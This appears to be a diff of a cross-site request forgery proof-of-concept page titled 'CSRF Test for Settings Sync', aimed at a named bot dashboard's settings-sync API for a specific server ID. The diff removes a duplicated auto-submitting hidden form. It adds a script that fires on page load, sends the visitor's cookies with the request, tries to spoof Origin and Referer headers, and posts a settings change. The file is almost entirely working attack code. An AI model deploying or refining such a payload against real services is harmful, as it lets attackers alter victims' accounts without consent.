@@ -9,24 +9,27 @@
     <form action="https://dashboard.wickbot.com/api/settings/sync/1358289702414979255" method="POST">
       <input type="hidden" name="data" value='{"IDS":["1310013982093869067"]}' />
     </form>
+
     <script>
-      document.forms[0].submit();
-    </script>
-  </body>
-</html>
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CSRF Test for Settings Sync</title>
-  </head>
-  <body>
-    <form action="https://dashboard.wickbot.com/api/settings/sync/1358289702414979255" method="POST">
-      <input type="hidden" name="data" value='{"IDS":["1310013982093869067"]}' />
-    </form>
-    <script>
-      document.forms[0].submit();
+      // Setting headers explicitly in case of cross-origin request
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", "https://dashboard.wickbot.com/api/settings/sync/1358289702414979255", true);
+      xhr.setRequestHeader("Content-Type", "application/json");
+      xhr.setRequestHeader("Referer", "https://dashboard.wickbot.com/guilds/1358289702414979255/lockdown");
+      xhr.setRequestHeader("Origin", "https://dashboard.wickbot.com");
+
+      // Including credentials (cookies)
+      xhr.withCredentials = true;
+
+      // Request payload
+      var body = JSON.stringify({
+        data: {
+          IDS: ["1310013982093869067"]
+        }
+      });
+
+      // Sending the request
+      xhr.send(body);
     </script>
   </body>
 </html>
